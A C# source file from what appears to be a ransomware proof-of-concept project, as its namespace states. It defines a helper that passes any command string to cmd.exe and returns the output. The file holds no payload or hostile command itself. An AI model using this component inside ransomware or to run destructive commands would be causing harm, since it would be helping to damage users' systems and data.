using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Diagnostics;

namespace Ilay_sRanomwarePoc
{
    static class CommandLineExecution
    {

        private const string CommandLine = @"C:\Windows\System32\cmd.exe";

        //optional//
        private const string WorkingDirectory = @"C:/Users/ilay/";
        public static string CommandExecution(string CmdCommand)  //executes a command and returns its output
        {
            try
            {
                Process Execution = new Process();
                ProcessStartInfo ExecutionInfo = new ProcessStartInfo(WorkingDirectory);
                ExecutionInfo.UseShellExecute = false;
                ExecutionInfo.RedirectStandardOutput = true;
                ExecutionInfo.FileName = CommandLine;
                ExecutionInfo.Arguments = $"/c {CmdCommand}";
                ExecutionInfo.WorkingDirectory = WorkingDirectory;
                Execution.StartInfo = ExecutionInfo;
                Execution.Start();
                string Output = Execution.StandardOutput.ReadToEnd();
                Execution.WaitForExit();
                Execution.Kill();
                return Output;


            }
            catch
            {
                Console.WriteLine("Error while trying to execute the cmd command!");
                return null;
            }



        }
    }

}

